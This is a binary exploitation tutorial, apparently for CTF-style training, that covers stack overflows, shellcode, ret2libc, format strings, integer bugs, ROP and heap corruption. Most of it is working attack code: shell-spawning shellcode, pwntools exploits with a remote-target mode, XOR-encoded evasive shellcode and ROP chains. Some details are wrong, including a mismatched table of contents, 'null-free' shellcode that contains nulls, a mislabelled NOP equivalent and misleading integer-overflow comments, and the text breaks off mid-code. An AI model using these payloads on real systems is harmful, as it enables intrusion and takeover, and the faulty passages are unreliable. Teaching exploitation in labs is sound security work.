# Binary Exploitation Learning Guide

## Table of Contents

1. [Binary Exploitation Fundamentals](#1-binary-exploitation-fundamentals)
2. [Memory Layout and Assembly Basics](#2-memory-layout-and-assembly-basics)
3. [Buffer Overflows](#3-buffer-overflows)
4. [Shellcode Development](#4-shellcode-development)
5. [Stack-based Exploitation](#5-stack-based-exploitation)
6. [Return-to-libc Attacks](#6-return-to-libc-attacks)
7. [Format String Vulnerabilities](#7-format-string-vulnerabilities)
8. [Integer Overflows](#8-integer-overflows)
9. [Binary Analysis Tools](#9-binary-analysis-tools)
10. [Exploit Development Process](#10-exploit-development-process)
11. [Return Oriented Programming (ROP)](#11-return-oriented-programming-rop)
12. [Heap Exploitation](#12-heap-exploitation)
13. [Advanced ROP Techniques](#13-advanced-rop-techniques)
14. [Kernel Exploitation](#14-kernel-exploitation)
15. [Modern Mitigations](#15-modern-mitigations)
16. [Bypassing ASLR](#16-bypassing-aslr)
17. [Bypassing Stack Canaries](#17-bypassing-stack-canaries)
18. [Advanced Heap Techniques](#18-advanced-heap-techniques)
19. [Fuzzing and Bug Discovery](#19-fuzzing-and-bug-discovery)
20. [Advanced Exploitation Techniques](#20-advanced-exploitation-techniques)

---

## 1. Binary Exploitation Fundamentals

Binary exploitation involves finding and exploiting vulnerabilities in compiled programs to gain unauthorized access or control.

### What is Binary Exploitation?

Binary exploitation targets vulnerabilities in compiled binaries to:
- Execute arbitrary code
- Bypass security mechanisms
- Gain elevated privileges
- Extract sensitive information

### Common Vulnerability Types

```c
// Buffer Overflow
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking
}

// Format String Bug
void format_bug(char *user_input) {
    printf(user_input);     // User controls format string
}

// Integer Overflow
void integer_bug(unsigned int size) {
    char *buffer = malloc(size + 1);  // size can wrap around
    if (buffer == NULL) return;
    // Use buffer...
}

// Use After Free
void use_after_free() {
    char *ptr = malloc(100);
    free(ptr);
    strcpy(ptr, "data");    // Using freed memory
}
```

### Exploitation Process Overview

```bash
# 1. Target Identification
file target_binary
checksec target_binary

# 2. Static Analysis
objdump -d target_binary
strings target_binary
readelf -a target_binary

# 3. Dynamic Analysis
gdb target_binary
ltrace target_binary
strace target_binary

# 4. Vulnerability Discovery
# - Fuzzing
# - Source code review
# - Reverse engineering

# 5. Exploit Development
# - Control flow hijacking
# - Code execution
# - Privilege escalation
```

## 2. Memory Layout and Assembly Basics

Understanding memory layout is crucial for exploitation.

### Process Memory Layout

```
High Memory
┌─────────────────┐
│     Stack       │ ← Growing downward
│        ↓        │
├─────────────────┤
│                 │
│    Unused       │
│                 │
├─────────────────┤
│        ↑        │ ← Growing upward
│      Heap       │
├─────────────────┤
│      Data       │ ← Initialized variables
├─────────────────┤
│      BSS        │ ← Uninitialized variables
├─────────────────┤
│      Text       │ ← Program code
└─────────────────┘
Low Memory
```

### Stack Frame Structure

```assembly
; Function prologue
push rbp        ; Save old base pointer
mov rbp, rsp    ; Set new base pointer
sub rsp, 0x20   ; Allocate local variables

; Stack layout after prologue:
; rbp+8  : Return address
; rbp+0  : Saved rbp (old base pointer)
; rbp-8  : Local variable 1
; rbp-16 : Local variable 2
; rbp-32 : Bottom of allocated space

; Function epilogue
mov rsp, rbp    ; Restore stack pointer
pop rbp         ; Restore old base pointer
ret             ; Return to caller
```

### x86-64 Calling Convention

```c
// System V ABI (Linux)
long function(long arg1, long arg2, long arg3, long arg4, long arg5, long arg6);
//            RDI      RSI      RDX      RCX      R8       R9

// Additional arguments passed on stack
// Return value in RAX
```

```assembly
; Example function call
mov rdi, 1      ; First argument
mov rsi, 2      ; Second argument
call function   ; Call function
; RAX contains return value
```

### Register Usage

```assembly
; General purpose registers (64-bit)
rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, r8-r15

; Common uses:
; RAX - Return values, syscall numbers
; RBX - Callee-saved
; RCX - Fourth argument, loop counter
; RDX - Third argument, data
; RSI - Second argument, source index
; RDI - First argument, destination index
; RBP - Frame pointer
; RSP - Stack pointer
; R8-R9 - Fifth and sixth arguments
; R10-R11 - Temporary
; R12-R15 - Callee-saved
```

## 3. Buffer Overflows

Buffer overflows occur when data exceeds allocated buffer boundaries.

### Stack Buffer Overflow

```c
// vulnerable.c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Vulnerable to overflow
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

### Overflow Demonstration

```bash
# Compile without protections
gcc -fno-stack-protector -z execstack -no-pie vulnerable.c -o vulnerable

# Normal execution
./vulnerable "Hello World"

# Trigger crash
./vulnerable $(python -c "print 'A' * 100")

# GDB analysis
gdb ./vulnerable
(gdb) run $(python -c "print 'A' * 100")
(gdb) info registers
(gdb) x/20xg $rsp
```

### Controlling Return Address

```python
# exploit.py
import struct

# Create payload
buffer_size = 64
padding = 8  # Saved RBP
target_address = 0x0000000000401234

payload = "A" * buffer_size          # Fill buffer
payload += "B" * padding             # Overwrite saved RBP
payload += struct.pack("<Q", target_address)  # Overwrite return address

print(payload)
```

### Finding Offset

```bash
# Using pattern_create (metasploit)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

# Run with pattern
gdb ./vulnerable
(gdb) run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

# Find offset using crashed RIP
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6341376341366341
```

## 4. Shellcode Development

Shellcode is position-independent machine code that executes arbitrary commands.

### Basic Shellcode Structure

```assembly
; execve("/bin/sh", NULL, NULL) shellcode
section .text
global _start

_start:
    ; Clear registers
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    
    ; Push "/bin/sh" onto stack
    push rax        ; Null terminator
    
    ; "/bin/sh" = 0x68732f6e69622f
    mov rbx, 0x68732f6e69622f
    push rbx
    
    ; Set up syscall arguments
    mov rdi, rsp    ; argv[0] = "/bin/sh"
    mov rax, 59     ; sys_execve
    syscall
```

### Null-free Shellcode

```assembly
; Avoiding null bytes
_start:
    ; Instead of: mov rax, 0
    xor rax, rax
    
    ; Instead of: mov rdi, 0x68732f6e69622f
    ; Push string in parts to avoid nulls
    push rax
    mov rbx, 0x68732f6e69622f
    push rbx
    mov rdi, rsp
    
    ; Use shorter instructions
    push rax        ; rsi = NULL
    pop rsi
    push rax        ; rdx = NULL  
    pop rdx
    
    ; Syscall
    mov al, 59      ; sys_execve (shorter than mov rax, 59)
    syscall
```

### Shellcode Testing

```c
// test_shellcode.c
char shellcode[] = 
    "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x50\x48\xbb"
    "\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb0\x3b\x0f\x05";

int main() {
    ((void (*)())shellcode)();
    return 0;
}
```

```bash
# Compile and test
gcc -z execstack test_shellcode.c -o test_shellcode
./test_shellcode
```

### Dynamic Shellcode Generation

```python
# generate_shellcode.py
from pwn import *

# Generate shellcode using pwntools
shellcode = asm(shellcraft.sh())
print("Shellcode length:", len(shellcode))
print("Shellcode (hex):", shellcode.hex())

# Check for null bytes
if b'\x00' in shellcode:
    print("WARNING: Shellcode contains null bytes!")
else:
    print("Shellcode is null-free")
```

## 5. Stack-based Exploitation

Exploiting buffer overflows to gain code execution.

### Basic Stack Overflow Exploit

```python
#!/usr/bin/env python3
# exploit.py
import struct
import subprocess

# Target binary information
buffer_size = 64
saved_rbp_size = 8
total_offset = buffer_size + saved_rbp_size

# Shellcode (execve /bin/sh)
shellcode = (
    b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x50\x48\xbb"
    b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
)

# NOP sled
nop_sled = b"\x90" * 32

# Return address (stack address)
ret_addr = 0x7fffffffe000  # Approximate stack address

# Build payload
payload = nop_sled + shellcode
payload += b"A" * (total_offset - len(payload))
payload += struct.pack("<Q", ret_addr)

# Execute exploit
with open("payload.txt", "wb") as f:
    f.write(payload)

print(f"Payload length: {len(payload)}")
print("Run: ./vulnerable $(cat payload.txt)")
```

### Finding Stack Address

```bash
# Using GDB to find stack address
gdb ./vulnerable
(gdb) break vulnerable_function
(gdb) run AAAA
(gdb) info registers rsp
(gdb) x/20xg $rsp
```

### Environment Variable Method

```c
// getenv.c - Get environment variable address
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    char *shell = getenv("SHELL");
    printf("SHELL environment variable at: %p\n", shell);
    return 0;
}
```

```bash
# Set environment variable with shellcode
export SHELLCODE=$(python -c "print '\x90' * 100 + '\x48\x31\xc0...'")

# Find address
./getenv
gdb ./vulnerable
(gdb) x/s *((char **)environ)
```

## 6. Return-to-libc Attacks

When stack execution is disabled, return to existing code.

### Basic ret2libc

```python
#!/usr/bin/env python3
# ret2libc.py
import struct
from pwn import *

# Find system() and "/bin/sh" addresses
binary = ELF("./vulnerable")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Addresses (these need to be found dynamically)
system_addr = 0x7ffff7a52390
binsh_addr = 0x7ffff7b97e9a
pop_rdi_ret = 0x0000000000401273  # ROP gadget

buffer_size = 64
saved_rbp_size = 8
offset = buffer_size + saved_rbp_size

# Build ROP chain
payload = b"A" * offset
payload += struct.pack("<Q", pop_rdi_ret)    # pop rdi; ret
payload += struct.pack("<Q", binsh_addr)     # "/bin/sh" address
payload += struct.pack("<Q", system_addr)    # system() address

print(payload)
```

### Finding Addresses at Runtime

```bash
# Find libc base address
gdb ./vulnerable
(gdb) info proc mappings
(gdb) p system
(gdb) find 0x7ffff7a00000, 0x7ffff7c00000, "/bin/sh"
```

### Using pwntools for ret2libc

```python
#!/usr/bin/env python3
from pwn import *

# Set up process
p = process("./vulnerable")
binary = ELF("./vulnerable")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Find ROP gadgets
rop = ROP(binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Leak libc address
payload1 = fit({
    72: [
        pop_rdi,
        binary.got['puts'],
        binary.plt['puts'],
        binary.symbols['main']
    ]
})

p.sendline(payload1)
puts_leak = unpack(p.recv(6).ljust(8, b'\x00'))
libc.address = puts_leak - libc.symbols['puts']

# Calculate addresses
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

# Final payload
payload2 = fit({
    72: [
        pop_rdi,
        binsh_addr,
        system_addr
    ]
})

p.sendline(payload2)
p.interactive()
```

## 7. Format String Vulnerabilities

Format string bugs allow reading/writing arbitrary memory.

### Basic Format String Bug

```c
// format_vuln.c
#include <stdio.h>
#include <stdlib.h>

int secret = 0x41424344;

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    printf(argv[1]);  // Vulnerable line
    printf("\n");
    
    printf("Secret: 0x%x\n", secret);
    return 0;
}
```

### Format String Exploration

```bash
# Compile
gcc -fno-stack-protector format_vuln.c -o format_vuln

# Basic testing
./format_vuln "Hello World"
./format_vuln "%x %x %x %x"
./format_vuln "%p %p %p %p"

# Stack dump
./format_vuln "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"
```

### Reading Memory

```bash
# Read from stack
./format_vuln "%8\$x"      # Read 8th parameter

# Read arbitrary address
./format_vuln "$(printf '\x60\x40\x40\x00\x00\x00\x00\x00')%8\$s"

# Find format string offset
./format_vuln "AAAA.%x.%x.%x.%x.%x.%x"  # Look for 41414141
```

### Writing Memory

```c
// format_write.c
#include <stdio.h>

int target = 0;

int main(int argc, char *argv[]) {
    printf("Target before: 0x%x\n", target);
    printf(argv[1]);
    printf("Target after: 0x%x\n", target);
    return 0;
}
```

```bash
# Write to target variable
./format_write "$(printf '\x60\x40\x40\x00\x00\x00\x00\x00')%8\$n"

# Write specific value using %hn (short write)
./format_write "$(printf '\x60\x40\x40\x00\x00\x00\x00\x00')%100x%8\$hn"
```

### Automated Format String Exploitation

```python
#!/usr/bin/env python3
from pwn import *

# Set up process
p = process("./format_vuln")
binary = ELF("./format_vuln")

# Find format string offset
for i in range(1, 20):
    p = process("./format_vuln")
    payload = f"AAAA%{i}$x"
    p.sendline(payload)
    result = p.recvall()
    if b"41414141" in result:
        offset = i
        print(f"Format string offset: {offset}")
        break
    p.close()

# Use pwntools FmtStr
def send_payload(payload):
    p = process(["./format_vuln", payload])
    return p.recvall()

autofmt = FmtStr(send_payload)
offset = autofmt.offset

print(f"Offset: {offset}")
```

## 8. Integer Overflows

Integer overflow vulnerabilities occur when arithmetic operations exceed data type limits.

### Integer Overflow Examples

```c
// integer_vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vulnerable_malloc(unsigned int size) {
    char *buffer;
    
    // Integer overflow: size + 1 can wrap to 0
    buffer = malloc(size + 1);
    if (buffer == NULL) {
        printf("Malloc failed\n");
        return;
    }
    
    // This can write beyond allocated memory
    memset(buffer, 'A', size);
    buffer[size] = '\0';
    
    printf("Buffer: %s\n", buffer);
    free(buffer);
}

void array_index_vuln() {
    int array[10] = {0};
    unsigned int index;
    
    printf("Enter index: ");
    scanf("%u", &index);
    
    // No bounds checking - negative numbers become large positive
    if (index < 10) {
        array[index] = 0x41414141;
        printf("Set array[%u] = 0x41414141\n", index);
    }
}

int main() {
    // Test integer overflow
    vulnerable_malloc(0xFFFFFFFF);  // Wraps to malloc(0)
    
    array_index_vuln();
    return 0;
}
```

### Signed/Unsigned Confusion

```c
// sign_vuln.c
#include <stdio.h>
#include <string.h>

int check_length(int len) {
    if (len > 100) {
        printf("Length too long!\n");
        return -1;
    }
    return 0;
}

void copy_data(char *src, int len) {
    char buffer[100];
    
    if (check_length(len) != 0) {
        return;
    }
    
    // len is treated as unsigned here
    memcpy(buffer, src, len);  // Can copy negative amount!
    printf("Copied %d bytes\n", len);
}

int main() {
    char data[200];
    memset(data, 'A', sizeof(data));
    
    // Pass negative length - passes check but causes overflow
    copy_data(data, -1);  // -1 becomes 0xFFFFFFFF when unsigned
    return 0;
}
```

### Width Conversion Issues

```c
// width_vuln.c
#include <stdio.h>
#include <stdlib.h>

void allocate_memory(short size) {
    char *buffer;
    
    printf("Requested size: %d\n", size);
    
    // Short promoted to int, then to size_t
    buffer = malloc(size);  // Can allocate more than intended
    
    if (buffer) {
        // Fill with data based on original short value
        memset(buffer, 'A', size);
        printf("Allocated and filled buffer\n");
        free(buffer);
    }
}

int main() {
    // 0x8000 as short = -32768, but malloc sees positive value
    allocate_memory(0x8000);
    return 0;
}
```

### Exploitation Techniques

```python
#!/usr/bin/env python3
# integer_exploit.py

import struct

def exploit_malloc_overflow():
    """Exploit malloc integer overflow"""
    # size = 0xFFFFFFFF
    # size + 1 = 0x00000000 (wraps to 0)
    # malloc(0) returns small chunk
    # memset writes 0xFFFFFFFF bytes - massive overflow
    
    size = 0xFFFFFFFF
    print(f"Exploit size: {size}")
    print(f"size + 1: {(size + 1) & 0xFFFFFFFF}")

def exploit_signed_confusion():
    """Exploit signed/unsigned confusion"""
    # Pass -1 as signed int
    # Treated as 0xFFFFFFFF when cast to unsigned
    
    malicious_len = -1
    print(f"Malicious length: {malicious_len}")
    print(f"As unsigned: {malicious_len & 0xFFFFFFFF}")

def find_overflow_values():
    """Find values that cause integer overflow"""
    import sys
    
    # 32-bit integer limits
    INT_MAX = 2**31 - 1
    UINT_MAX = 2**32 - 1
    
    print(f"INT_MAX: {INT_MAX}")
    print(f"UINT_MAX: {UINT_MAX}")
    
    # Values that cause overflow
    overflow_values = [
        UINT_MAX,
        UINT_MAX - 1,
        INT_MAX + 1,
        -1,
        -2
    ]
    
    for val in overflow_values:
        print(f"Value: {val}, +1: {(val + 1) & 0xFFFFFFFF}")

if __name__ == "__main__":
    exploit_malloc_overflow()
    exploit_signed_confusion()
    find_overflow_values()
```

## 9. Binary Analysis Tools

Essential tools for binary analysis and exploitation.

### Static Analysis Tools

```bash
# File information
file binary
readelf -a binary
objdump -d binary
strings binary

# Security mitigations
checksec binary

# Function analysis
objdump -t binary | grep FUNC
nm binary

# Disassembly
objdump -M intel -d binary
ndisasm -b 64 binary

# Hex analysis
xxd binary
hexdump -C binary
```

### Dynamic Analysis with GDB

```bash
# Basic GDB usage
gdb ./binary
(gdb) set disassembly-flavor intel
(gdb) break main
(gdb) run arg1 arg2
(gdb) info registers
(gdb) info stack
(gdb) x/20xg $rsp
(gdb) disassemble main

# Advanced GDB commands
(gdb) info proc mappings
(gdb) find 0x400000, 0x500000, "string"
(gdb) search-pattern AAAA
(gdb) vmmap
(gdb) telescope $rsp 20
```

### GDB with pwndbg/GEF

```bash
# Install pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# pwndbg commands
(gdb) checksec
(gdb) vmmap
(gdb) stack
(gdb) telescope
(gdb) context
(gdb) rop
(gdb) search -t string "/bin/sh"
```

### Binary Analysis with radare2

```bash
# Basic r2 usage
r2 binary
[0x00400000]> aaa    # Analyze all
[0x00400000]> pdf    # Print disassembly function
[0x00400000]> afl    # List functions
[0x00400000]> s main # Seek to main
[0x00400000]> VV     # Visual mode

# Information gathering
[0x00400000]> i      # Binary info
[0x00400000]> ir     # Relocations
[0x00400000]> ii     # Imports
[0x00400000]> iz     # Strings

# Search functionality
[0x00400000]> / string      # Search string
[0x00400000]> /x 4141       # Search hex
[0x00400000]> /R pop rdi    # Search ROP gadgets
```

### Automated Tools

```bash
# ROPgadget
ROPgadget --binary binary
ROPgadget --binary binary --only "pop|ret"
ROPgadget --binary binary --string "/bin/sh"

# one_gadget (for libc)
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# pwninit (for CTF setup)
pwninit --bin binary --libc libc.so.6

# Ghidra (GUI)
ghidra
```

### pwntools Framework

```python
#!/usr/bin/env python3
from pwn import *

# Context setup
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

# Binary analysis
binary = ELF('./binary')
print(f"Entry point: {hex(binary.entry)}")
print(f"Architecture: {binary.arch}")
print(f"PIE enabled: {binary.pie}")

# Find functions and gadgets
main_addr = binary.symbols['main']
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']

# ROP gadgets
rop = ROP(binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

print(f"Main: {hex(main_addr)}")
print(f"puts@plt: {hex(puts_plt)}")
print(f"puts@got: {hex(puts_got)}")
print(f"pop rdi; ret: {hex(pop_rdi)}")
```

## 10. Exploit Development Process

Systematic approach to developing reliable exploits.

### Vulnerability Assessment

```python
#!/usr/bin/env python3
# vuln_assessment.py

class VulnAssessment:
    def __init__(self, binary_path):
        self.binary = binary_path
        self.vulns = []
        
    def check_mitigations(self):
        """Check security mitigations"""
        import subprocess
        result = subprocess.run(['checksec', self.binary], 
                              capture_output=True, text=True)
        print("Security Mitigations:")
        print(result.stdout)
        
    def find_dangerous_functions(self):
        """Find potentially dangerous functions"""
        dangerous = ['strcpy', 'sprintf', 'gets', 'scanf', 'printf']
        
        with open(self.binary, 'rb') as f:
            content = f.read()
            
        for func in dangerous:
            if func.encode() in content:
                print(f"Found dangerous function: {func}")
                
    def analyze_stack_usage(self):
        """Analyze stack buffer usage"""
        # This would involve more complex analysis
        print("Analyzing stack buffer usage...")
        
    def run_assessment(self):
        self.check_mitigations()
        self.find_dangerous_functions()
        self.analyze_stack_usage()

# Usage
assessment = VulnAssessment('./vulnerable_binary')
assessment.run_assessment()
```

### Exploit Template

```python
#!/usr/bin/env python3
# exploit_template.py
from pwn import *

# Configuration
BINARY = './target'
LIBC = './libc.so.6'
HOST = 'target.com'
PORT = 1337

# Context
context.binary = BINARY
context.log_level = 'debug'

def exploit_local():
    """Local exploitation"""
    p = process(BINARY)
    return exploit(p)

def exploit_remote():
    """Remote exploitation"""
    p = remote(HOST, PORT)
    return exploit(p)

def exploit(p):
    """Main exploit logic"""
    binary = ELF(BINARY)
    
    # Stage 1: Information leak
    leak_payload = create_leak_payload()
    p.sendline(leak_payload)
    
    leak = p.recvline()
    libc_base = parse_leak(leak)
    
    # Stage 2: Code execution
    exec_payload = create_exec_payload(libc_base)
    p.sendline(exec_payload)
    
    return p

def create_leak_payload():
    """Create payload to leak addresses"""
    binary = ELF(BINARY)
    rop = ROP(binary)
    
    payload = b'A' * 72  # Overflow to return address
    payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
    payload += p64(binary.got['puts'])
    payload += p64(binary.plt['puts'])
    payload += p64(binary.symbols['main'])
    
    return payload

def parse_leak(leak_data):
    """Parse leaked address to find libc base"""
    leaked_puts = unpack(leak_data[:6].ljust(8, b'\x00'))
    libc = ELF(LIBC)
    libc_base = leaked_puts - libc.symbols['puts']
    log.info(f"Libc base: {hex(libc_base)}")
    return libc_base

def create_exec_payload(libc_base):
    """Create payload for code execution"""
    libc = ELF(LIBC)
    libc.address = libc_base
    
    binary = ELF(BINARY)
    rop = ROP(binary)
    
    payload = b'A' * 72
    payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
    payload += p64(next(libc.search(b'/bin/sh')))
    payload += p64(libc.symbols['system'])
    
    return payload

if __name__ == '__main__':
    if args.REMOTE:
        p = exploit_remote()
    else:
        p = exploit_local()
    
    p.interactive()
```

### Exploit Development Workflow

```bash
#!/bin/bash
# exploit_workflow.sh

echo "=== Binary Exploitation Workflow ==="

# 1. Initial analysis
echo "[1] Initial Analysis"
file $1
checksec $1

# 2. Static analysis
echo "[2] Static Analysis"
objdump -d $1 | head -50
strings $1 | grep -E "(bin|sh|flag)"

# 3. Dynamic analysis
echo "[3] Dynamic Analysis"
echo "Starting GDB session..."
gdb $1 << EOF
set disassembly-flavor intel
info functions
disassemble main
quit
EOF

# 4. Vulnerability identification
echo "[4] Vulnerability Testing"
echo "Testing buffer overflow..."
echo $(python -c "print 'A' * 100") | ./$1

# 5. Exploit development
echo "[5] Exploit Development"
echo "Create exploit.py for this binary"

# 6. Testing and refinement
echo "[6] Testing Phase"
echo "Test exploit with different payloads"
```

### Debugging Exploits

```python
#!/usr/bin/env python3
# debug_exploit.py
from pwn import *

def debug_exploit():
    """Debug exploit with GDB attached"""
    
    # GDB script for debugging
    gdb_script = '''
    set disassembly-flavor intel
    break *main+42
    break *vulnerable_function+123
    continue
    '''
    
    # Start process with GDB
    p = gdb.debug('./target', gdbscript=gdb_script)
    
    # Send payload and debug
    payload = create_payload()
    p.sendline(payload)
    
    # Interactive session for debugging
    p.interactive()

def analyze_crash():
    """Analyze crash to understand exploit failure"""
    
    # Start process
    p = process('./target')
    
    # Send payload
    payload = create_test_payload()
    p.sendline(payload)
    
    # Check if crashed
    try:
        p.recv(timeout=1)
        print("Process still running")
    except EOFError:
        print("Process crashed")
        
        # Get core dump info
        core = Coredump('./core')
        print(f"Crashed at: {hex(core.pc)}")
        print(f"Stack pointer: {hex(core.sp)}")

def test_payload_lengths():
    """Test different payload lengths to find exact offset"""
    
    for length in range(60, 100, 4):
        print(f"Testing length: {length}")
        
        p = process('./target')
        payload = b'A' * length
        
        try:
            p.sendline(payload)
            p.recv(timeout=1)
            p.close()
        except EOFError:
            print(f"Crash at length: {length}")
            break

if __name__ == '__main__':
    debug_exploit()
```

## 11. Advanced Memory Corruption

### Understanding Memory Layout Exploitation

Memory corruption beyond basic buffer overflows requires understanding advanced memory structures and allocation patterns.

**Heap Feng Shui**
```c
// Controlling heap layout for exploitation
#include <stdlib.h>
#include <string.h>

// Create specific heap layout
void* ptrs[10];
char* target;

// Allocate chunks in specific order
for(int i = 0; i < 5; i++) {
    ptrs[i] = malloc(32);
}

target = malloc(64);  // Target chunk

for(int i = 5; i < 10; i++) {
    ptrs[i] = malloc(32);
}

// Free specific chunks to create layout
free(ptrs[1]);
free(ptrs[3]);

// Trigger controlled allocation
char* controlled = malloc(32);
strcpy(controlled, payload);  // Controlled data
```

**Use-After-Free Exploitation**
```c
// Classic UAF vulnerability
typedef struct {
    void (*func_ptr)(void);
    char data[32];
} object_t;

object_t* obj = malloc(sizeof(object_t));
obj->func_ptr = legitimate_function;
strcpy(obj->data, "normal data");

free(obj);  // Object freed but pointer remains

// Attacker reallocates freed memory
char* evil_data = malloc(sizeof(object_t));
strcpy(evil_data, evil_payload);  // Contains fake func_ptr

obj->func_ptr();  // Calls attacker-controlled address
```

**Double-Free Exploitation**
```c
// Double-free vulnerability leading to corruption
char* ptr1 = malloc(64);
char* ptr2 = malloc(64);

free(ptr1);
free(ptr2);
free(ptr1);  // Double-free vulnerability

// Attacker can now control freed chunk metadata
char* evil1 = malloc(64);
char* evil2 = malloc(64);
char* evil3 = malloc(64);  // Returns ptr1 again
```

**Type Confusion**
```c++
// Type confusion in C++
class BaseObject {
public:
    virtual void process() = 0;
    int type_id;
};

class FileHandler : public BaseObject {
public:
    void process() override { /* file operations */ }
    FILE* file_ptr;
};

class NetworkHandler : public BaseObject {
public:
    void process() override { /* network operations */ }
    int socket_fd;
    char buffer[256];
};

// Vulnerability: incorrect type casting
BaseObject* obj = get_object_by_id(user_input);
NetworkHandler* net = static_cast<NetworkHandler*>(obj);
// If obj is actually FileHandler, we have type confusion
net->process();  // Unpredictable behavior
```

### Advanced Shellcode Techniques

**Polymorphic Shellcode**
```python
# Generate polymorphic shellcode
import random

def generate_polymorphic_nop():
    nops = [
        b"\x90",                # nop
        b"\x40\x00\xc0",       # add eax, eax (nop equivalent)
        b"\x97",                # xchg eax, edi
        b"\x97",                # xchg eax, edi (back)
        b"\x96",                # xchg eax, esi
        b"\x96",                # xchg eax, esi (back)
    ]
    return random.choice(nops)

def generate_polymorphic_payload(shellcode):
    # Add random NOP equivalents
    poly_payload = b""
    for i in range(10):
        poly_payload += generate_polymorphic_nop()
    
    # Encode shellcode with XOR
    key = random.randint(1, 255)
    encoded = bytes([b ^ key for b in shellcode])
    
    # Decoder stub
    decoder = f"""
    mov bl, {key}
    lea esi, [rel encoded_data]
    mov ecx, {len(shellcode)}
decode_loop:
    xor byte [esi], bl
    inc esi
    loop decode_loop
encoded_data:
    """
    
    return poly_payload + encoded
```

**Self-Modifying Shellcode**
```assembly
; Self-modifying shellcode that changes during execution
section .text
global _start

_start:
    ; Make memory executable
    mov rax, 10         ; mprotect syscall
    mov rdi, payload    ; address
    mov rsi, 1000       ; size
    mov rdx, 7          ; PROT_READ|PROT_WRITE|PROT_EXEC
    syscall
    
    ; Modify the payload at runtime
    mov byte [payload + 5], 0x48  ; Change instruction
    mov byte [payload + 6], 0x31  ; 
    mov byte [payload + 7], 0xc0  ; xor rax, rax
    
    ; Jump to modified code
    jmp payload

payload:
    ; This will be modified at runtime
    mov rax, 1          ; Original instruction
    mov rdi, 1
    mov rsi, message
    mov rdx, 13
    syscall
    
    ; Exit
    mov rax, 60
    xor rdi, rdi
    syscall

message: db "Hello World!", 10
```

## 12. Return-Oriented Programming (ROP)

### ROP Fundamentals

ROP bypasses DEP/NX by chaining existing code snippets (gadgets) to perform arbitrary computation.

**Finding ROP Gadgets**
```bash
# Using ROPgadget
ROPgadget --binary ./vulnerable_binary

# Common useful gadgets
# pop rdi; ret         - Set first argument
# pop rsi; ret         - Set second argument  
# pop rdx; ret         - Set third argument
# pop rax; ret         - Set syscall number
# syscall; ret         - Execute syscall
# add rsp, 0x20; ret   - Stack adjustment
```

**Basic ROP Chain**
```python
#!/usr/bin/env python3
from pwn import *

# Binary and gadget addresses
binary = ELF('./vulnerable')
libc = ELF('./libc.so.6')

# ROP gadgets (find with ROPgadget or ropper)
pop_rdi = 0x401234      # pop rdi; ret
pop_rsi = 0x401235      # pop rsi; ret  
pop_rdx = 0x401236      # pop rdx; ret
pop_rax = 0x401237      # pop rax; ret
syscall_ret = 0x401238  # syscall; ret

# Build ROP chain for execve("/bin/sh", NULL, NULL)
rop_chain = flat([
    pop_rax, 59,           # syscall number for execve
    pop_rdi, next(binary.search(b'/bin/sh')), # first argument
    pop_rsi, 0,            # second argument (NULL)
    pop_rdx, 0,            # third argument (NULL)  
    syscall_ret            # execute syscall
])

# Complete exploit
payload = b"A" * 72     # Padding to return address
payload += rop_chain

# Send payload
p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

**Advanced ROP Techniques**

*Stack Pivoting*
```python
# When limited stack space, pivot to larger area
leave_ret = 0x401250    # leave; ret (mov rsp, rbp; pop rbp; ret)
pop_rbp = 0x401251      # pop rbp; ret

# Pivot stack to controlled memory region
pivot_payload = flat([
    pop_rbp, heap_address,  # Set new stack base
    leave_ret               # Pivot to new stack
])

# Stage 1: Minimal ROP to pivot
stage1 = b"A" * 72 + pivot_payload

# Stage 2: Full ROP chain in controlled memory
stage2 = full_rop_chain
```

*ROP with ASLR Bypass*
```python
# Leak addresses first, then build ROP
def leak_libc():
    # Stage 1: Leak libc address
    leak_rop = flat([
        pop_rdi, binary.got['puts'],   # puts address as argument
        binary.plt['puts'],            # call puts
        binary.symbols['main']         # return to main for second exploit
    ])
    
    payload1 = b"A" * 72 + leak_rop
    p.sendline(payload1)
    
    # Parse leaked address
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.info(f"Libc base: {hex(libc.address)}")
    
    return libc.address

# Stage 2: Use leaked addresses for final exploit
libc_base = leak_libc()
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

final_rop = flat([
